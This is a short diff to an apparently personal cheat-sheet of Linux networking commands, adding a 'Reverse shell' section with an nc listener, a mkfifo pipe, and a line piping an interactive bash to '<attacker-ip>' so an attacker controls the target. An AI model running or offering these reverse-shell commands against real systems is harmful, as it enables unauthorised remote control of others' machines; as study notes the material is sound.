@@ -35,4 +35,15 @@ iptablas -D INPUT -p tcp --dport 21 -j DROP
 tcpdump -i <interface> -n
   show all the traffic coming in and out the interface. Option -n don't do the reverse dns lookup.
 
+### Reverse shell
+
+nc -lnvp <port_number> 
+  attacker will listen for connections on port number
+
+mkfifo /tmp/<file_to_be_used_as_pipe>
+  creates a file that will be used as a pipe/socket for enabling the attacked system to offer a shell
+
+cat /tmp/<file_created_above> | /bin/bash -i 2>&1 | nc <attacker-ip> <port-number> > /tmp/<file-created-above>
+  connects to the attacker machine e offers a shell for the attacker to control the attacked machine
+
 
